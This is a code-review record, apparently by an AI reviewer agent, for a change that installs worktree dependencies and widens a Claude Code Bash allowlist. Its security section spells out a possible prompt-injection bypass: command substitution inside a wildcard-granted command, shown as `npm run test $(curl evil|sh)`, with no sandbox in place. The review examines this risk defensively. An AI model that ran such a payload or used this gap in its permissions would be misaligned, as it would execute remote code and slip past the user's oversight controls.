verdict: merge
reviewed-by: fresh reviewer sub-agent, claude-sonnet-5, dispatched by session tldr-experts-4a
against: ac14af2

# fix/story-dod-deps — reviewed against ac14af2 (rebased onto #212 + #210, 1237d8e), gh #209

Second re-verification. First rebase: 7a208cd (base a15fbc5) → bbfed22 (base c33bc82, 0.14.3),
one import-union conflict (`relaunchCommand` kept alongside `worktreeDeps` imports in
`executors/build.ts`) — confirmed clean in the prior record revision. Second rebase: bbfed22 →
ac14af2 (base 1237d8e, #212 watcher-card-none + #210 run-outcome-honesty landed), conflicting
ONLY on CHANGELOG.md — verified below. `git diff c33bc82..bbfed22` vs `git diff 1237d8e..ac14af2`,
both excluding CHANGELOG.md and stripped of `index`/`@@` lines: **byte-identical, exit 0**. So
none of this branch's non-CHANGELOG code moved a second time; all code findings below are
unchanged from the original review.

## CHANGELOG union (this rebase's actual conflict)

Upstream (origin/main at 1237d8e) landed `## 0.15.0 — unreleased` with its own `### Fixed`
(2 bullets, #210) then `### Added` (2 bullets, #212 + #210) — the shape that would collide with
this branch's own `### Added`/`### Fixed` pair under the same heading and produce a duplicated
heading of one kind (the thing §7/§12 forbid). The implementer instead built ONE `### Added`
(3 bullets: #209 install, #212 watcher-card-none, #210 run.yml outcome) and ONE `### Fixed`
(5 bullets: #210 build-gate-delivered, #210 ship-refuses, and this branch's 3 #209 bullets) —
confirmed by `grep -n '^## \|^### '`: exactly one heading of each kind under `## 0.15.0`.
Content check: sorted-line diff of origin/main's 0.15.0 section against local's 0.15.0 section
shows **zero lines present upstream and missing locally** — all 4 upstream bullet titles
(Build-gate-delivered, ship-refuses, watcher-card-none, run.yml-outcome) survive verbatim,
plus this branch's own 4. Dated sections (`## 0.14.3` onward) are **byte-identical** to
origin/main (`diff` from the `## 0.14.3` heading to EOF: exit 0) — untouched, as required.
`bash scripts/release-check.sh --ci` — **exit 0** ("release check OK for 0.14.3"; the two
"differs from vX:CHANGELOG.md" lines are pre-existing recorded amendments unrelated to this
branch, and one dated section was skipped for lacking a local tag — neither is new here).

## Wildcard allowlist security (the item asked to weigh most) — Minor, PLAUSIBLE, not blocking

Fetched code.claude.com/docs/en/permissions (2026-09-09) directly rather than trusting the
PR's own citation. Confirmed, quoted: "Claude Code is aware of shell operators, so a rule like
`Bash(safe-cmd *)` won't give it permission to run the command `safe-cmd && other-cmd`. The
recognized command separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule must
match each subcommand independently." So `Bash(npm run test *)` does NOT let a `;`/`&&`/`|`
chain reach an ungranted program — CONFIRMS the PR's own claim and the comment in
`spawnAgent.ts:198`.

One nuance the PR's comment does not mention: the same doc section states subshells and
command substitutions are reached only by **deny/ask** rules ("Deny and ask rules apply when
any subcommand matches them, including a command nested inside a subshell, a command
substitution... even in auto mode") — it does not make the equivalent claim for allow rules.
Read plainly, that asymmetry suggests an allow-rule text match may not recurse into a `$(...)`
embedded in a granted command's trailing arguments, so `npm run test $(curl evil|sh)` could
textually satisfy `Bash(npm run test *)` without a deny rule to stop it. I have NOT run a live
Claude Code session to confirm this either way — this is inferred from doc wording, not
measured, and is exactly the kind of prompt-injection-into-Bash-args risk `--sandbox` (not
passed for the Claude path in `buildClaudeArgs`, only for Codex) is meant to backstop. It is
not a new class this PR introduces, though: the repo already ships `Bash(git add *)` /
`Bash(git commit *)` with the identical trailing-wildcard shape, so the same theoretical
surface already existed for the two verbs every developer turn ends on; this PR only extends
it to the repo's own declared build/test commands. Recommend filing a follow-up issue to
verify empirically (spawn a Claude Code session with only a wildcard grant and try a
substitution) rather than blocking this fix on it.

## Traced and CONFIRMED against the diff and worktree (re-verified at ac14af2; line numbers
below are ac14af2's — unchanged from bbfed22's for `executors/build.ts` since the second
rebase's own diff is byte-identical there; content unchanged throughout)

- `installCommandFor`/`runWorktreeInstall`/`absentBinaryOf`/`binaryAbsentReason` in the new
  `worktreeDeps.ts` are wired exactly as claimed: `installDeps()` (`executors/build.ts:1818`)
  called from `prepare()` (:698, in-session) and `buildHalf()` (:1189, headless), both gated on
  `story.freshWorktree` and both running AFTER any `this.writes.run(...)` block returns —
  outside the serial writer, as the code comment states.
- `install:` is read via `commandRoles`, never sniffed from command text (`installCommandFor`),
  and `hooks/lib/workspace.ts:239-241` already adds every role's value — install included —
  into the flat `commands` allowlist, so `runDodCommand` does not refuse it. This is pre-existing
  code this branch does not touch.
- Reviewer paths never call `installDeps` (grepped all `openStory`/`installDeps` call sites) —
  reviewer worktrees genuinely get no install, and `REVIEWER_TOOLS` (`Read,Grep,Glob,Bash(git
  diff *)`) is untouched, confirmed by both the diff and a passing test assertion.
- `freshWorktree` guards double-install: since it's only true the FIRST call that creates the
  worktree, a re-open (any of the four other `openStory` call sites, all post-build review
  paths where a merged commit already exists) sees `freshWorktree: false` and skips.
- 127 handling: `absentBinaryOf` only fires on exit 127, non-refused, non-timeout; `notFoundBinary`
  checks the zsh spelling first specifically to avoid capturing "zsh" itself as the binary name,
  correct on both fixture strings and exercised by a real test.
- Golden: exactly one added key, `tree: "worktree"`, on the five existing `check: "dod"`
  payloads across the four fixture files (headless #04, insession #03, refused #04, rounds #04
  and #11) — no other line changed. Named in CHANGELOG under `## 0.15.0 — unreleased` /
  `### Fixed`, satisfying §12's "say so" rule.
- Pre-flight parity: `baseResultOf`/`redBaseRefusal` (`dodRunner.ts`) write to
  `04-build/preflight.yml` only — they never emit a `check: "dod"` event at all, so there is no
  base-side event payload for `tree: "base"` to parity with. `preflight.yml` rows already carry
  `baseRef`/`baseSha`, which is how a reader tells them apart from the story's `events.jsonl`
  rows. Acceptable as-is; not a gap this diff created.
- docs/spec.md edits sit inside §2.1 (line 108, the `commands.install` row) and §2.9 (now lines
  1362-1381 post both rebases, `tree`/`absent_binary`/`check:"install"`), matching the hunt list. EN/ES
  `unattended-operation.md` renumber the checklist in lockstep (1→6 both files) and both guides'
  new bullets read as real translations, not machine copies.
- `test/story-worktree-deps.test.ts`: exactly 8 new tests, hermetic (real `git worktree`, a
  committed `node install.js`/`install-fail.js`, `node_modules/.bin/dodbin` built by the fixture,
  own `PATH`/env cleanup in `afterEach`), calls `setDefaultTimeout(spawnTestTimeout())` so
  `test/machine-load.test.ts`'s dynamic `readdirSync`-based spawner check picks it up with no
  manual edit needed there.

## Commands run (targeted only, this worktree)

Original review (against 7a208cd):
- `bun run typecheck` — exit 0.
- `bun test test/story-worktree-deps.test.ts test/build-golden.test.ts test/dod-allowlist.test.ts
  test/build-executor.test.ts test/stack-packs-prompt.test.ts test/facilitator.test.ts
  test/training.test.ts` — **352 pass, 0 fail, exit 0**.

Re-verification after first rebase (against bbfed22): `git diff a15fbc5..7a208cd` vs
`git diff c33bc82..bbfed22`, excluding CHANGELOG.md — byte-identical except the one
`relaunchCommand` import-union line.
- `bun run typecheck` — exit 0.
- `bun test test/story-worktree-deps.test.ts test/build-golden.test.ts
  test/build-executor.test.ts` — **144 pass, 0 fail, exit 0**.

Re-verification after second rebase (against ac14af2): `git diff c33bc82..bbfed22` vs
`git diff 1237d8e..ac14af2`, excluding CHANGELOG.md — byte-identical, exit 0.
- CHANGELOG union inspected (see above) — one heading per kind, no upstream bullet lost, dated
  sections byte-identical to origin/main.
- `bash scripts/release-check.sh --ci` — exit 0.
- `bun run typecheck` — exit 0.
- `bun test test/story-worktree-deps.test.ts test/build-golden.test.ts` — **12 pass, 0 fail,
  exit 0**.

No Critical or Important findings. The fix matches its own claims: `install:` now runs once
per fresh story worktree through the same allowlist-and-argv runner as any DoD command, a 127
is read as an environment absence rather than a red test, and the wider Bash grant is bounded
by Claude Code's own compound-command awareness for the chaining case that matters most. The
one open question (nested command substitution under a trailing-wildcard grant) is flagged
above as follow-up work, not a blocker, since it extends rather than introduces the risk shape
this repo already ships for `git add`/`git commit`.
